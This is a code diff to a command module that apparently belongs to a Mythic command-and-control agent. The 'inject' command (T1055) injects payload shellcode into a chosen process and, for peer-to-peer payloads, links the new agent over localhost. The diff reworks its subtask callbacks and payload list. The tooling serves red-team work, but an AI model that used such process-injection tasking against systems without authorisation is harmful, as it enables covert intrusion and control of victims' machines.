@@ -5,6 +5,7 @@ import base64
 import sys
 import asyncio
 
+
 class InjectArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
@@ -51,9 +52,11 @@ class InjectArguments(TaskArguments):
         if payload_search.Success:
             file_names = []
             for f in payload_search.Payloads:
-                file_names.append(f"{f.Filename} - {f.Description}")
+                value = f"{f.Filename} - {f.Description}"
+                if value not in file_names:
+                    file_names.append(value)
             fileResponse.Success = True
-            file_names.sort()
+            file_names.reverse()
             fileResponse.Choices = file_names
             return fileResponse
         else:
@@ -72,8 +75,44 @@ class InjectArguments(TaskArguments):
             raise Exception("Required non-zero PID")
 
 
+temp_inject_link_data = {}
+
+
+async def link_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus=task.SubtaskData.Task.Status, Completed=True)
+    resp = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
+        TaskID=task.SubtaskData.Task.ID
+    ))
+    for r in resp.Responses:
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=task.TaskData.Task.ID,
+            Response=r.Response
+        ))
+    return response
+
+
 async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
-    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
+    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=True)
+    resp = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(
+        TaskID=task.SubtaskData.Task.ID
+    ))
+    for r in resp.Responses:
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=task.TaskData.Task.ID,
+            Response=r.Response
+        ))
+    if "error" not in task.SubtaskData.Task.Status:
+        if task.TaskData.Task.ID in temp_inject_link_data:
+            response.Completed = False
+            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
+                TaskID=task.TaskData.Task.ID,
+                CommandName="link",
+                SubtaskCallbackFunction="link_callback",
+                Params=json.dumps({
+                    "connection_info": temp_inject_link_data[task.TaskData.Task.ID]
+                })
+            ))
+            del temp_inject_link_data[task.TaskData.Task.ID]
     return response
 
 
@@ -90,7 +129,7 @@ class InjectCommand(CommandBase):
     author = "@djhohnstein"
     argument_class = InjectArguments
     attackmapping = ["T1055"]
-    completion_functions = {"inject_callback": inject_callback}
+    completion_functions = {"inject_callback": inject_callback, "link_callback": link_callback}
     supported_ui_features = ["process_browser:inject"]
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
@@ -161,33 +200,27 @@ class InjectCommand(CommandBase):
         if not is_p2p:
             subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                 TaskID=taskData.Task.ID,
-                SubtaskCallbackFunction="inject_callback",
                 CommandName="shinject",
                 Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
             ))
         else:
+            connection_info = {
+                "host": "127.0.0.1",
+                "agent_uuid": str_uuid,
+                "c2_profile": c2_info.to_json()
+            }
+            connection_info["c2_profile"]["name"] = connection_info["c2_profile"]["c2_profile"]
+            temp_inject_link_data[taskData.Task.ID] = connection_info
             subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                 TaskID=taskData.Task.ID,
+                SubtaskCallbackFunction="inject_callback",
                 CommandName="shinject",
                 Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
             ))
-            if subtask.Success:
-                connection_info = {
-                    "host": "127.0.0.1",
-                    "agent_uuid": str_uuid,
-                    "c2_profile": c2_info
-                }
-                subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-                    TaskID=taskData.Task.ID,
-                    CommandName="link",
-                    SubtaskCallbackFunction="inject_callback",
-                    Params=json.dumps({
-                        "connection_info": connection_info
-                    })
-                ))
-            else:
+            if not subtask.Success:
                 response.Success = False
                 response.Error = subtask.Error
+                del temp_inject_link_data[taskData.Task.ID]
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
